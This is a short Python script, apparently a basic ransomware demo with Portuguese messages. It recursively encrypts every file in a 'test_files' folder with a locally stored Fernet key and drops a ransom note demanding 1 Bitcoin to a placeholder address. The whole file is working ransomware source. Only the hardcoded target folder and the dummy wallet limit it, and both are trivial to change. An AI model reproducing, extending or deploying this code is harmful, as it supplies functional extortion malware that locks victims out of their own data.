import os
from cryptography.fernet import Fernet # type: ignore

def generate_key():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

def load_key():
    return open("chave.key", "rb").read()

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        original_data = file.read()
    encrypted_data = fernet.encrypt(original_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def search_files(directory):
    list =[]
    for root, dirs, files in os.walk(directory):
        for name in files:
            if name != "ransoware.py" and not name.endswith(".key"):
                list.append(os.path.join(root, name))
    return list

def create_message_rescue():
    with open("RESCUE-ARQUIVOS.txt", "w") as file:
        file.write("Seus arquivos foram criptografados!\n")
        file.write("Envie um 1Bitcoin para o endereço XYZ para recuperar seus arquivos.\n")
        file.write("Após o pagamento, envie um email para recuperar seus arquivos.\n")
        file.write("Aviso: Não tente descriptografar os arquivos sozinho, isso pode causar perda de dados.\n")
        file.write("Boa sorte!\n")

def main():
    generate_key()
    key = load_key()
    target_directory = search_files("test_files")
    for file_path in target_directory:
        encrypt_file(file_path, key)
    create_message_rescue()
    print("Criptografia concluída. Leia o arquivo RESCUE-ARQUIVOS.txt para mais instruções.")

if __name__ == "__main__":
    main()
